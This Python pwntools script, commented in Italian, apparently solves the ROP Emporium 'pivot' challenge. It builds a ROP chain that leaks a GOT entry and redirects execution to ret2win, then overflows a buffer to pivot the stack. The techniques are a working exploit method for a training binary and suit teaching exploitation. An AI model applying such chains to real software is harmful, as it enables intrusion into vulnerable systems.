from pwn import *
from pprint import pprint
import warnings

warnings.filterwarnings("ignore")

offset = 40
pop_rax_gadget = int(hex(0x004009bb),0) # pop rax; ret; 
pop_rbp_gadget = int(hex(0x004007c8),0) # pop rbp; ret;
xchg_raxrsp_gadget = int(hex(0x004009bd),0) # xchg rax, rsp; ret;
mov_raxmrax_gadget = int(hex(0x004009c0),0) # mov rax, qword ptr [rax]; ret; 
add_raxrbp_gadget = int(hex(0x004009c4),0) # add rax, rbp; ret;
call_rax = int(hex(0x004006b0),0) # call rax;

# context.log_level = 'debug'

def set_env(binary,library) : # funzione per settare i principali parametri del sistema
    
    elf = context.binary = ELF(binary)
    libc = ELF(library)
    p = elf.process()
    rop = ROP(elf)
    return elf, p, rop, libc
    
def pivoting_stack(idx_pivot): # funzione che crea una chain per dirottare lo stack ad un indirizzo da noi specificato (scambia contenuto di rsp)
    
    rop.raw(pop_rax_gadget) # pop rax; ret; carichiamo l'indirizzo su cui risiedere il nostro stack fittizzio con la rop chain che abbiamo mandato prima
    rop.raw(idx_pivot) # mettiamo nello chain l'indirizzo su cui punterà poi rsp, per fare il pivoting
    rop.raw(xchg_raxrsp_gadget) # xchg rax, rsp; ret; viene scambiato il contenuto di rax con quello di rsp, così rsp punterà ora all'indirizzo specificato
                                # da noi 
    
def send_payload(w_off) :  # se w_off è true viene aggiunto al payload l'offset per mandare in overflow il buffer
    
    if w_off : 
        payload = [ 
            b"A" * offset,
            rop.chain()
        ]   
    else : 
        payload = [ 
            rop.chain()
        ]   
    payload = b"".join(payload)
    p.send(payload)

# debug
# gdbscript = "b *main"
# pid = gdb.attach(p, gdbscript=gdbscript)

# *--------------------- ENV SET ---------------------*

elf, p, rop, libc = set_env('./pivot', "./libpivot.so") # setting del sistema

# *---------------------  START  ---------------------*

# pprint(elf.symbols)

# *------------------  1 : 1 chain  ------------------*

p.recvuntil("pivot: ")

stack_pivot = int(p.recvline().rstrip().decode('utf-8'),16) # ricezione dell'indirizzo su cui fare pivoting dello stack
p.recvline() # Send a ROP chain now and it will land there\n'

ret2win_off = libc.symbols["ret2win"] - libc.symbols["foothold_function"] # calcoliamo l'offset tra gli indirizzi nella libreria tra ret2win e foothold_function
log.info(f"Ho creato il mio stack a partire da questo indirizzo in memoria  : {hex(stack_pivot)}")

rop = ROP(elf)
rop.raw(elf.symbols["foothold_function"])  # chiamiamo foothold_function per la prima volta così da aggiornare la sua entry nella tabella got.plt
rop.raw(pop_rax_gadget) # pop rax; ret; inseriamo in rax il vlaore aggiornato della entry di foothold_function della tabella got.plt
rop.raw(elf.got["foothold_function"]) # carichiamo nello stack l'indirizzo che punta all'indirizzo effettivo in memoria della funzione foothold_function
rop.raw(mov_raxmrax_gadget) # mov rax, qword ptr [rax]; ret; carichiamo in rax il contenuto di ciò a cui punta l'indirizzo caricato in precedenza
rop.raw(pop_rbp_gadget) # pop rbp; ret; carichiamo in rbp l'offset da aggiungere poi all'indirizzo effettivo su cui risiede in memoria foothold_function
rop.raw(ret2win_off) # carichiamo l'offset nello stack
rop.raw(add_raxrbp_gadget) # add rax, rbp; ret; sommiamo l'offset all'indirizzo in memoria di foothold_function
rop.raw(call_rax) # call rax; ret; facciamo una call al contenuto di rax così da richiamare la funzione ret2win ora che il contenuto di rax coorrisponde
                  # all'indirizzo di ret2win in memoria 
send_payload(False)

p.recvuntil("smash\n") # Now please send your stack smash\n'
log.info(f"Calcolato l'offset tra ret2win e foothold_function nella libpivot.so : {hex(ret2win_off)}")

# *------------------  2 : 2 chain  ------------------*

rop = ROP(elf)      
pivoting_stack(stack_pivot) # funzione che crea una chain per dirottare lo stack ad un indirizzo da noi specificato (scambia contenuto di rsp)

send_payload(True)

p.recvuntil("pivot\n") # foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot\n'

flag = p.recvline()
log.critical(f"Questa è la flag : {flag.decode('utf-8')}")

# *------------------      END      ------------------*